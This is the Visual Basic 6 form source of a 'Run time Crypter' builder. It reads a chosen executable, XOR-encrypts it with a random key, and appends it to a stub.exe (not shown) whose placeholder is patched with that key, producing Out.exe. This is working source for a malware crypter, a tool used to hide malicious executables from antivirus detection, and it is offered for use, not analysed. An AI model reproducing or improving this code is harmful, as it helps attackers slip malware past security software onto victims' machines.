VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Run time Crypter"
   ClientHeight    =   1275
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   3615
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1275
   ScaleWidth      =   3615
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command2 
      Caption         =   "&Crypt File "
      Height          =   495
      Left            =   120
      TabIndex        =   3
      Top             =   720
      Width           =   3375
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   3000
      TabIndex        =   2
      Top             =   360
      Width           =   495
   End
   Begin MSComDlg.CommonDialog cd1 
      Left            =   2160
      Top             =   1440
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      Filter          =   "*.exe|*.exe"
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   2775
   End
   Begin VB.Label Label1 
      Caption         =   "&File :"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
With cd1
.ShowOpen
Text1.Text = .FileName
End With
End Sub
Private Sub Command2_Click()
Dim sData As String
Dim sStub  As String
Dim eNc   As String
sData = ReadData(Text1.Text)
sStub = ReadData(App.path & "\stub.exe")
eNc = done
On Local Error Resume Next
Kill App.path & "\Out.exe"
Open App.path & "\Out.exe" For Binary As #1
Put #1, , Replace(sStub, "0123456789", eNc)
Put #1, , "E@" & Encrypt(sData, eNc) & "E@"
Close #1
MsgBox "File Sucefully Protected", vbInformation, "Crypter"
End Sub
Public Function done() As String

done = ""
For i = 1 To 10
If i = 2 Or i = 4 Or i = 6 Then
done = done & RandomNumber
Else
done = done & RandomLetter
End If
Next i
End Function
Public Function Encrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte

Encrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Encrypt = StrConv(b, vbUnicode)
End Function
Public Function RandomNumber() As Integer
Randomize
var1 = Int(9 * Rnd)
RandomNumber = var1
End Function
Public Function ReadData(path As String) As String
Open path For Binary As #1
ReadData = Input(FileLen(path), 1)
Close #1

End Function
Public Function RandomLetter() As String
Anfang:
Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Randomize
var1 = Int(26 * Rnd)
If var1 = 0 Then GoTo Anfang
RandomLetter = Mid(Keyset, var1, 1)
End Function
